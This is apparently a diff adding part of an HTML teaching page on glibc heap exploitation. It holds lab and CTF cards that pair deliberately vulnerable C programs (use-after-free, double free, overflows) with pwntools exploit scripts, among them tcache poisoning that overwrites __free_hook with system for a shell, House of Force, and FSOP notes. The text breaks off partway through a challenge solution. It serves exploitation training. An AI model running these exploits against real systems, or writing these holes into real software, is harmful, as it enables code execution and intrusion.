+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Perform a double free with tcache key bypass, poison tcache to overwrite <code>__free_hook</code> with <code>system</code>, then free a chunk containing "/bin/sh" to get a shell.</p>
+
+          <h5>Vulnerable Program</h5>
+<pre><code class="language-c">// lab4_double_free.c
+// Compile: gcc -o lab4_double_free lab4_double_free.c -no-pie
+// Requires: glibc 2.31 (has __free_hook, has tcache key, no safe-linking)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    char *chunks[16] = {0};
+    int choice, idx;
+    size_t size;
+
+    while (1) {
+        puts("\n1. Allocate");
+        puts("2. Free");
+        puts("3. Write");
+        puts("4. Read");
+        puts("5. Exit");
+        printf("&gt; ");
+        scanf("%d", &amp;choice);
+
+        switch (choice) {
+            case 1:
+                printf("Index: "); scanf("%d", &amp;idx);
+                printf("Size: ");  scanf("%zu", &amp;size);
+                if (idx &gt;= 0 &amp;&amp; idx &lt; 16) {
+                    chunks[idx] = malloc(size);
+                    printf("Chunk %d @ %p\n", idx, chunks[idx]);
+                }
+                break;
+            case 2:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &gt;= 0 &amp;&amp; idx &lt; 16) {
+                    free(chunks[idx]);
+                    // BUG: no NULL — UAF for double free
+                }
+                break;
+            case 3:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &gt;= 0 &amp;&amp; idx &lt; 16 &amp;&amp; chunks[idx]) {
+                    printf("Data: ");
+                    read(0, chunks[idx], 0x80);
+                }
+                break;
+            case 4:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &gt;= 0 &amp;&amp; idx &lt; 16 &amp;&amp; chunks[idx]) {
+                    printf("Data: ");
+                    write(1, chunks[idx], 0x20);
+                    puts("");
+                }
+                break;
+            case 5:
+                return 0;
+        }
+    }
+}</code></pre>
+
+          <h5>Exploit</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab4_double_free')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def alloc(idx, size):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def free(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def write_chunk(idx, data):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Data: ', data)
+
+def read_chunk(idx):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.recvuntil(b'Data: ')
+    return p.recv(0x20)
+
+# ═══════════════════════════════════════════════
+# PHASE 1: Leak libc via unsorted bin
+# ═══════════════════════════════════════════════
+
+# Fill tcache for 0x90-sized chunks (need 7 to fill tcache, 8th goes to unsorted)
+for i in range(9):
+    alloc(i, 0x80)  # chunk size 0x90
+# Guard chunk to prevent consolidation with top
+alloc(9, 0x20)
+
+# Free 0-6 → fill tcache[0x90]
+for i in range(7):
+    free(i)
+# Free 7 → goes to unsorted bin
+free(7)
+
+# Read chunk 7's fd via UAF → libc leak
+leak_data = read_chunk(7)
+leaked = u64(leak_data[:8])
+log.info(f"unsorted bin fd: {hex(leaked)}")
+
+# Calculate libc base
+main_arena_offset = libc.symbols['__malloc_hook'] + 0x10
+libc.address = leaked - (main_arena_offset + 96)
+log.success(f"libc base: {hex(libc.address)}")
+
+free_hook = libc.symbols['__free_hook']
+system = libc.symbols['system']
+log.info(f"__free_hook: {hex(free_hook)}")
+log.info(f"system:      {hex(system)}")
+
+# ═══════════════════════════════════════════════
+# PHASE 2: Double free → tcache poison → overwrite __free_hook
+# ═══════════════════════════════════════════════
+
+# Drain tcache[0x90] by allocating 7 chunks (indices 10-15 + reuse 0)
+for i in range(7):
+    alloc(i, 0x80)
+
+# Now tcache[0x90] is empty. Allocate a fresh chunk for double free.
+alloc(10, 0x80)
+alloc(11, 0x80)  # barrier
+
+# Free chunk 10 → tcache[0x90]: [10]
+free(10)
+
+# Bypass tcache key: overwrite key field (user_data + 0x8) via UAF
+write_chunk(10, p64(0) + p64(0))  # clear next and key
+
+# Double free chunk 10 → tcache[0x90]: [10 → 10] (cycle)
+free(10)
+
+# Pop first 10 from tcache, write __free_hook as next pointer
+alloc(12, 0x80)
+write_chunk(12, p64(free_hook))
+
+# Pop second 10 (cycle entry)
+alloc(13, 0x80)
+
+# Pop __free_hook — now we have a chunk at __free_hook
+alloc(14, 0x80)
+
+# Write system() to __free_hook
+write_chunk(14, p64(system))
+log.success("__free_hook overwritten with system()")
+
+# ═══════════════════════════════════════════════
+# PHASE 3: Trigger system("/bin/sh")
+# ═══════════════════════════════════════════════
+
+# Write "/bin/sh\0" into chunk 11
+write_chunk(11, b'/bin/sh\x00')
+
+# free(chunk11) → __free_hook(chunk11) → system("/bin/sh")
+free(11)
+
+p.interactive()</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Fastbin Dup</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit the classic fastbin double-free (pre-tcache, glibc &lt; 2.26) to get overlapping chunks and overwrite a target variable.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// lab5_fastbin_dup.c
+// Compile: gcc -o lab5 lab5_fastbin_dup.c -no-pie -Wl,-z,norelro
+// Test with: glibc 2.23 (no tcache)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+long target = 0;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("target @ %p\n", &amp;target);
+
+    // Fastbin dup: free(a), free(b), free(a) → fastbin: a → b → a
+    char *a = malloc(0x60);
+    char *b = malloc(0x60);
+    char *c = malloc(0x60);
+
+    free(a);
+    free(b);  // bypass double-free check (head != chunk)
+    free(a);  // a is now in fastbin twice: a → b → a
+
+    // Allocate from fastbin, overwrite a's fd with &amp;target
+    char *d = malloc(0x60);  // gets 'a'
+    // Write &amp;target as the fd pointer (first 8 bytes of user data)
+    *(unsigned long *)d = (unsigned long)&amp;target;
+
+    malloc(0x60);  // gets 'b'
+    malloc(0x60);  // gets 'a' again (from cycle)
+
+    // This allocation returns &amp;target (fake chunk)
+    // Fastbin requires size check: target area must have valid size field
+    char *evil = malloc(0x60);
+
+    // Write to target
+    *(unsigned long *)evil = 0xdeadbeef;
+
+    if (target == 0xdeadbeef)
+        puts("FLAG{fastbin_dup_success}");
+    else
+        printf("target = 0x%lx\n", target);
+}</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+# This lab is a single-binary demo. Run it directly:
+# The key concept: free(a), free(b), free(a) bypasses glibc 2.23's
+# simple check (only compares head of free list).
+# Result: fastbin[0x70]: a → b → a (circular)
+# After poisoning a's fd → arbitrary allocation target
+
+p = process('./lab5')
+p.interactive()</code></pre>
+          <p><strong>Note:</strong> On glibc 2.26+, fastbins are rarely used — tcache absorbs small allocations first. Use tcache poisoning instead (Lab 2).</p>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: House of Force</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Overwrite the top chunk's size field with <code>0xffffffffffffffff</code> (-1), then use a precisely-calculated <code>malloc()</code> to move the top chunk pointer to any target address.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// lab6_house_of_force.c
+// Compile: gcc -o lab6 lab6_house_of_force.c -no-pie -Wl,-z,norelro
+// Requires: glibc &lt; 2.29 (no top chunk size validation)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+long target = 0;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("target @ %p\n", &amp;target);
+
+    // Allocate initial chunk — overflow this to corrupt top chunk
+    char *p1 = malloc(0x100);
+    printf("p1 @ %p\n", p1);
+
+    // Simulate heap overflow into top chunk size
+    printf("Enter data (overflow into top chunk): ");
+    read(0, p1, 0x200);  // overflow!
+
+    // Now malloc a calculated size to move top chunk to target
+    printf("Enter malloc size: ");
+    size_t sz;
+    scanf("%zu", &amp;sz);
+    malloc(sz);
+
+    // Next allocation lands at target
+    char *evil = malloc(0x100);
+    printf("evil @ %p\n", evil);
+
+    printf("Enter value: ");
+    read(0, evil, 8);
+
+    if (target == 0xdeadbeef)
+        puts("FLAG{house_of_force_success}");
+    else
+        printf("target = 0x%lx\n", target);
+}</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab6')
+
+p.recvuntil(b'target @ ')
+target = int(p.recvline().strip(), 16)
+p.recvuntil(b'p1 @ ')
+p1 = int(p.recvline().strip(), 16)
+
+# Overflow: fill 0x100 bytes of data + overwrite top chunk size
+# Top chunk metadata is at p1 + 0x100 (user data) → prev_size at +0x100, size at +0x108
+payload = b'A' * 0x100        # fill p1 buffer
+payload += p64(0)             # prev_size of top chunk
+payload += p64(0xffffffffffffffff)  # top chunk size = -1 (huge)
+
+p.sendafter(b'overflow): ', payload)
+
+# Calculate distance: top_chunk_user_data → target
+# top chunk user data starts at: p1 + 0x100 + 0x10 (metadata of top) + 0x10 (next alloc metadata)
+top_chunk = p1 + 0x110  # top chunk user data after the overflowed chunk
+
+# We want: top_chunk + malloc_size + 0x10 (metadata) = target
+# So: malloc_size = target - top_chunk - 0x10
+distance = target - top_chunk - 0x10 - 0x10
+
+p.sendlineafter(b'size: ', str(distance).encode())
+
+# This malloc moves top chunk to target area
+# Next malloc gives us a chunk at target
+p.sendafter(b'value: ', p64(0xdeadbeef))
+
+p.interactive()</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Unsorted Bin Attack (Write)</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Corrupt an unsorted bin chunk's <code>bk</code> pointer to write a large value (<code>main_arena+88</code>) to an arbitrary address. Classic technique for overwriting <code>__malloc_hook</code> or <code>global_max_fast</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// lab7_unsorted_bin_attack.c
+// Compile: gcc -o lab7 lab7_unsorted_bin_attack.c -no-pie
+// Requires: glibc &lt; 2.29 (no unsorted bin bk validation)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+long target = 0;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("target @ %p\n", &amp;target);
+
+    char *a = malloc(0x410);  // will go to unsorted bin (skip tcache)
+    malloc(0x20);             // guard chunk
+
+    free(a);  // a goes to unsorted bin, a-&gt;bk = &amp;main_arena.bins[0]
+
+    // UAF: overwrite a-&gt;bk with &amp;target - 0x10
+    // When malloc services from unsorted bin:
+    //   victim-&gt;bk-&gt;fd = unsorted_bin_head (a large libc address)
+    // So: *(target - 0x10 + 0x10) = *(target) = libc_address
+    printf("Enter bk value: ");
+    read(0, a + 8, 8);  // overwrite bk (fd is at +0, bk at +8)
+
+    malloc(0x410);  // triggers unsorted bin scan → writes to target
+
+    printf("target = 0x%lx\n", target);
+    if (target != 0)
+        puts("FLAG{unsorted_bin_attack_write}");
+}</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab7')
+
+p.recvuntil(b'target @ ')
+target = int(p.recvline().strip(), 16)
+
+# Overwrite bk with &amp;target - 0x10
+# The unsorted bin code does: victim-&gt;bk-&gt;fd = unsorted_chunks(av)
+# bk-&gt;fd means *(bk + 0x10), so to write to target: bk = target - 0x10
+p.sendafter(b'bk value: ', p64(target - 0x10))
+p.interactive()</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Tcache Stashing Unlink</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit the tcache stashing mechanism — when <code>malloc</code> services a request from smallbin, remaining smallbin chunks get stashed into tcache without proper validation. Use this to get an arbitrary chunk.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// lab8_tcache_stash.c
+// Compile: gcc -o lab8 lab8_tcache_stash.c -no-pie
+// Requires: glibc 2.31
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+long target = 0;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("target @ %p\n", &amp;target);
+
+    // Fill tcache[0x100] with 7 entries
+    char *tc[7];
+    for (int i = 0; i &lt; 7; i++) tc[i] = malloc(0xf0);
+    char *guard = malloc(0x20);
+    for (int i = 0; i &lt; 7; i++) free(tc[i]);
+
+    // Put 2 chunks in smallbin[0x100]
+    // (allocate large to sort unsorted → smallbin)
+    char *a = malloc(0xf0);
+    char *g1 = malloc(0x20);
+    char *b = malloc(0xf0);
+    char *g2 = malloc(0x20);
+    free(a); free(b);
+    malloc(0x200);  // sorts unsorted bin → a,b move to smallbin
+
+    // Drain tcache partially (remove 5 entries, leave count=2)
+    for (int i = 0; i &lt; 5; i++) malloc(0xf0);
+
+    // Now: tcache[0x100] count=2, smallbin[0x100] has a,b
+    // UAF: corrupt b-&gt;bk to point to &amp;target - 0x10
+    // When malloc(0xf0) services from smallbin:
+    //   1. Returns 'a' from smallbin
+    //   2. Stashes 'b' into tcache
+    //   3. Follows b-&gt;bk → stashes fake chunk (&amp;target-0x10) into tcache
+    printf("Corrupt bk: ");
+    read(0, b + 8, 8);  // UAF write to b-&gt;bk
+
+    malloc(0xf0);  // triggers stashing
+
+    // Now tcache contains &amp;target area. Next alloc of 0xf0 gives target
+    char *evil = malloc(0xf0);
+    *(long *)evil = 0xdeadbeef;
+
+    if (target == 0xdeadbeef)
+        puts("FLAG{tcache_stashing_unlink}");
+}</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab8')
+p.recvuntil(b'target @ ')
+target = int(p.recvline().strip(), 16)
+
+# b-&gt;bk = &amp;target - 0x10
+# Stashing does: tcache_put(bk-&gt;fd ... ) — effectively puts target area in tcache
+p.sendafter(b'Corrupt bk: ', p64(target - 0x10))
+p.interactive()</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Safe-Linking Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: On glibc 2.32+, tcache/fastbin fd pointers are obfuscated with safe-linking (<code>PROTECT_PTR</code>). Learn to bypass by leaking the heap base or recovering the XOR key.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Safe-linking: fd is stored as (fd >> 12) ^ ptr
+// To poison: new_fd = (target) ^ (chunk_addr >> 12)
+
+// Deobfuscate:
+// If chunk is at addr A, stored fd = real_fd ^ (A >> 12)
+// First freed chunk in empty tcache: real_fd = 0
+// So stored fd = 0 ^ (A >> 12) = A >> 12
+// Reading this leaked value gives us heap_base >> 12</code></pre>
+          </div>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab9')
+
+def alloc(idx, size):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def free(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def read_chunk(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    return p.recvline()
+
+def write_chunk(idx, data):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendafter(b'Data: ', data)
+
+# Step 1: Leak heap address via safe-linking
+alloc(0, 0x28)
+free(0)
+
+# Read obfuscated fd: stored = real_fd ^ (chunk_addr >> 12)
+# Since tcache was empty, real_fd = 0, so stored = chunk_addr >> 12
+leak = u64(read_chunk(0).strip().ljust(8, b'\x00'))
+heap_base = leak << 12
+log.info(f"heap base: {hex(heap_base)}")
+
+# Step 2: Tcache poison with safe-linking encoding
+alloc(1, 0x28)
+free(1)
+
+# chunk 1 address (approximate based on heap layout)
+chunk1_addr = heap_base + 0x2c0  # adjust per binary
+
+# Encode the target address for safe-linking
+target_addr = 0x404060  # example: some writable target
+encoded_fd = target_addr ^ (chunk1_addr >> 12)
+
+write_chunk(1, p64(encoded_fd))
+
+alloc(2, 0x28)  # pops chunk 1
+alloc(3, 0x28)  # pops target → arbitrary write!
+
+log.success("Got chunk at target address")</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: House of Einherjar</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use a single null-byte overflow to trigger backward consolidation with a fake chunk, achieving overlapping chunks.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Concept: null-byte overflow clears the PREV_INUSE bit of the next chunk
+// and sets a fake prev_size to point back to a crafted fake chunk.
+// When the next chunk is freed, backward consolidation merges it with
+// the fake chunk, creating an overlapping allocation.
+
+// lab10_einherjar.c
+// Compile: gcc -o lab10 lab10_einherjar.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    char *chunks[16] = {0};
+    int choice, idx;
+    size_t size;
+
+    while(1) {
+        puts("1.Alloc 2.Free 3.Write 4.Read 5.Exit");
+        printf("&gt; "); scanf("%d", &amp;choice);
+        switch(choice) {
+            case 1:
+                printf("Idx: "); scanf("%d", &amp;idx);
+                printf("Size: "); scanf("%zu", &amp;size);
+                chunks[idx] = malloc(size);
+                break;
+            case 2:
+                printf("Idx: "); scanf("%d", &amp;idx);
+                free(chunks[idx]);
+                break;
+            case 3:
+                printf("Idx: "); scanf("%d", &amp;idx);
+                printf("Len: "); scanf("%zu", &amp;size);
+                printf("Data: ");
+                read(0, chunks[idx], size);  // off-by-one null byte possible
+                break;
+            case 4:
+                printf("Idx: "); scanf("%d", &amp;idx);
+                write(1, chunks[idx], 0x20); puts("");
+                break;
+            case 5: return 0;
+        }
+    }
+}</code></pre>
+          </div>
+<pre><code class="language-python"># House of Einherjar overview:
+# 1. Allocate chunk A (0x100), chunk B (0x100), chunk C (guard)
+# 2. Free chunk A → goes to unsorted/tcache
+# 3. Craft a fake chunk inside A's user data with valid fd/bk (point to itself)
+# 4. Null-byte overflow from B into C's prev_inuse bit
+# 5. Set C's prev_size to distance from C back to fake chunk
+# 6. Free C → backward consolidation merges fake chunk + B + C
+# 7. Malloc returns overlapping region covering B → UAF/overlapping control
+
+# This is highly glibc-version specific. The fake chunk must pass:
+# - unlink checks: FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P
+# - prev_size == chunk_size of the "previous" free chunk</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: __malloc_hook / __free_hook Targeting</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Overwrite <code>__malloc_hook</code> or <code>__free_hook</code> with <code>system</code> or a one_gadget to get code execution. Classic technique for glibc &lt; 2.34.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab11')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# Assume we've already leaked libc base and have arbitrary write
+
+# === __free_hook method (cleanest) ===
+# Overwrite __free_hook with system
+# Then free() a chunk containing "/bin/sh"
+free_hook = libc.sym['__free_hook']
+system = libc.sym['system']
+
+# arbitrary_write(free_hook, system)  # via tcache poison, etc.
+# Then:
+# write "/bin/sh\0" into some chunk
+# free(that_chunk) → __free_hook("/bin/sh") → system("/bin/sh")
+
+# === __malloc_hook method ===
+# Overwrite __malloc_hook with one_gadget
+# Then trigger malloc() (e.g., via printf with large format)
+malloc_hook = libc.sym['__malloc_hook']
+one_gadget = libc.address + 0x4f302
+
+# arbitrary_write(malloc_hook, one_gadget)
+# Trigger: printf("%100000c") forces malloc internally → __malloc_hook → shell
+
+# === Realloc trick for stack alignment ===
+# If one_gadget needs [rsp+0x30]==NULL but stack is misaligned:
+# __malloc_hook = realloc + 2 (or +4, +6... skips push insns)
+# __realloc_hook = one_gadget
+# malloc() → __malloc_hook → realloc() → __realloc_hook → one_gadget
+realloc = libc.sym['realloc']
+# arbitrary_write(libc.sym['__realloc_hook'], one_gadget)
+# arbitrary_write(libc.sym['__malloc_hook'], realloc + 2)</code></pre>
+          </div>
+          <p><strong>Important:</strong> <code>__malloc_hook</code> and <code>__free_hook</code> were removed in glibc 2.34. For newer libc, use FSOP or TLS <code>dtor_list</code> attacks (see Lab 12).</p>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Post-2.34 Exploitation (No Hooks)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a heap vulnerability on glibc 2.35+ where <code>__malloc_hook</code>/<code>__free_hook</code> no longer exist. Target <code>_IO_list_all</code> (FSOP) or the TLS <code>dtor_list</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># FSOP (File Stream Oriented Programming) — glibc 2.35+
+# Target: _IO_list_all → chain of _IO_FILE_plus structs
+# On exit(), glibc flushes all file streams via _IO_flush_all_lockp
+# If we overwrite a file struct's vtable or use the wide-data path:
+
+# Strategy: House of Apple 2 (by roderick01)
+# 1. Leak libc + heap addresses
+# 2. Forge a fake _IO_FILE_plus in a controlled heap chunk
+# 3. Set _wide_data to point to a fake wide_data struct
+# 4. Set vtable to _IO_wfile_jumps (valid vtable range — passes check)
+# 5. _IO_wfile_overflow calls _wide_data-&gt;_wide_vtable-&gt;__doallocate
+# 6. __doallocate points to system() with "/bin/sh" as the FILE* arg
+
+# The fake FILE struct layout (simplified):
+# _flags  = "  sh" (0x68732020 — serves as "/bin/sh" prefix for system)
+# _IO_write_ptr &gt; _IO_write_base (triggers flush)
+# _wide_data → fake_wide_data (on heap)
+# vtable → _IO_wfile_jumps (in libc — passes vtable range check)
+
+# fake_wide_data:
+# _IO_wide_data._wide_vtable → fake_vtable
+# fake_vtable.__doallocate → system
+
+from pwn import *
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# These offsets are version-specific
+io_wfile_jumps = libc.sym['_IO_wfile_jumps']
+system = libc.sym['system']
+io_list_all = libc.sym['_IO_list_all']
+
+log.info(f"_IO_wfile_jumps: {hex(io_wfile_jumps)}")
+log.info(f"_IO_list_all:    {hex(io_list_all)}")
+log.info(f"system:          {hex(system)}")</code></pre>
+          </div>
+<pre><code class="language-bash"># Alternative: TLS dtor_list overwrite
+# On exit, __call_tls_dtors() iterates dtor_list and calls each entry
+# dtor_list is in thread-local storage (TLS)
+# Each entry: { .func = PTR_DEMANGLE(fn), .obj = arg, .next = ... }
+# PTR_DEMANGLE: rotl(ptr ^ fs:[0x30], 0x11)
+# Need to leak the pointer guard from fs:[0x30] or overwrite it too
+
+# Steps:
+# 1. Leak/overwrite pointer guard in TLS
+# 2. Forge a dtor_list entry with func=system, obj="/bin/sh"
+# 3. Overwrite dtor_list head pointer
+# 4. Call exit() → __call_tls_dtors → system("/bin/sh")</code></pre>
+        </div>
+
+      </div>
+
+      <!-- ==================== CTF TAB ==================== -->
+      <div class="tab-content" id="ctf">
+
+        <!-- Challenge 1 -->
+        <div class="ctf-card">
+          <h4>Challenge 1: NoteKeeper</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A simple heap note manager. The developer forgot to NULL out pointers after freeing. Exploit the UAF to leak the secret and get the flag.</p>
+
+          <h5>Source</h5>
+<pre><code class="language-c">// notekeeper.c
+// Compile: gcc -o notekeeper notekeeper.c -no-pie -z norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+struct Note {
+    void (*print_func)(struct Note *);
+    char content[56];
+};
+
+void print_note(struct Note *note) {
+    printf("Note: %s\n", note-&gt;content);
+}
+
+void win() {
+    puts("FLAG{notekeeper_uaf_heap}");
+    exit(0);
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    struct Note *notes[4] = {0};
+    int choice, idx;
+
+    printf("win() @ %p\n", win);
+
+    while (1) {
+        puts("\n1. New note\n2. Delete note\n3. Print note\n4. Edit note\n5. Exit");
+        printf("&gt; ");
+        scanf("%d", &amp;choice);
+
+        switch (choice) {
+            case 1:
+                printf("Index (0-3): "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt; 3) break;
+                notes[idx] = malloc(sizeof(struct Note));
+                notes[idx]-&gt;print_func = print_note;
+                printf("Content: ");
+                read(0, notes[idx]-&gt;content, 56);
+                break;
+            case 2:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt; 3) break;
+                free(notes[idx]);
+                // BUG: notes[idx] not set to NULL
+                break;
+            case 3:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt; 3 || !notes[idx]) break;
+                notes[idx]-&gt;print_func(notes[idx]);  // calls function pointer
+                break;
+            case 4:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt; 3 || !notes[idx]) break;
+                printf("Content: ");
+                read(0, notes[idx]-&gt;content, 56);
+                break;
+            case 5:
+                return 0;
+        }
+    }
+}</code></pre>
+
+          <h5>Solution</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./notekeeper')
+
+p.recvuntil(b'win() @ ')
+win_addr = int(p.recvline().strip(), 16)
+log.info(f"win @ {hex(win_addr)}")
+
+def new_note(idx, content):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Index (0-3): ', str(idx).encode())
+    p.sendlineafter(b'Content: ', content)
+
+def delete_note(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def print_note(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def edit_note(idx, content):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Content: ', content)
+
+# sizeof(Note) = 8 (func ptr) + 56 (content) = 64 = 0x40
+# Chunk size = 0x50
+
+# 1. Create note 0
+new_note(0, b'AAAA')
+
+# 2. Free note 0 (dangling pointer remains)
+delete_note(0)
+
+# 3. Create note 1 — same size, gets same chunk from tcache
+#    The first 8 bytes of user data overlap with print_func
+#    Write win() address as the function pointer
+new_note(1, p64(win_addr) + b'padding')
+
+# 4. Call print on note 0 (dangling pointer) — note 0 and note 1 are same memory
+#    print_func is now win()
+print_note(0)
+
+p.interactive()</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The <code>Note</code> struct starts with a function pointer. When you free a note and allocate a new one of the same size, the new note's data overlaps the old note's struct. Write the <code>win()</code> address at offset 0 and call print on the old (dangling) index.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 2 -->
+        <div class="ctf-card">
+          <h4>Challenge 2: HeapDB</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A database-style heap challenge. You can store and retrieve "records." There's a UAF that allows tcache poisoning. Overwrite a GOT entry to redirect execution to <code>win()</code>.</p>
+
+          <h5>Source</h5>
+<pre><code class="language-c">// heapdb.c
+// Compile: gcc -o heapdb heapdb.c -no-pie -z norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+#define MAX_RECORDS 8
+#define RECORD_SIZE 0x28
+
+char *records[MAX_RECORDS];
+
+void win() {
+    system("/bin/sh");
+}
+
+void menu() {
+    puts("\n=== HeapDB ===");
+    puts("1. Add record");
+    puts("2. Delete record");
+    puts("3. View record");
+    puts("4. Edit record");
+    puts("5. Exit");
+    printf("&gt; ");
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    int choice, idx;
+
+    printf("Useful: win @ %p | puts@GOT: %p\n", win, &amp;puts);
+
+    while (1) {
+        menu();
+        scanf("%d", &amp;choice);
+
+        switch (choice) {
+            case 1:
+                printf("Index (0-7): "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_RECORDS) break;
+                records[idx] = malloc(RECORD_SIZE);
+                printf("Data: ");
+                read(0, records[idx], RECORD_SIZE);
+                break;
+            case 2:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_RECORDS) break;
+                free(records[idx]);
+                // BUG: dangling pointer
+                break;
+            case 3:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_RECORDS || !records[idx]) break;
+                printf("Record: ");
+                write(1, records[idx], RECORD_SIZE);
+                puts("");
+                break;
+            case 4:
+                printf("Index: "); scanf("%d", &amp;idx);
+                if (idx &lt; 0 || idx &gt;= MAX_RECORDS || !records[idx]) break;
+                printf("Data: ");
+                read(0, records[idx], RECORD_SIZE);
+                break;
+            case 5:
+                exit(0);
+        }
+    }
+}</code></pre>
+
+          <h5>Solution</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./heapdb')
+elf = ELF('./heapdb')
+
+# Parse addresses
+p.recvuntil(b'win @ ')
+win_addr = int(p.recvuntil(b' |', drop=True), 16)
+p.recvuntil(b'puts@GOT: ')
+puts_got = int(p.recvline().strip(), 16)
+log.info(f"win @ {hex(win_addr)}")
+log.info(f"puts@GOT @ {hex(puts_got)}")
+
+def add(idx, data):
+    p.sendlineafter(b'> ', b'1')
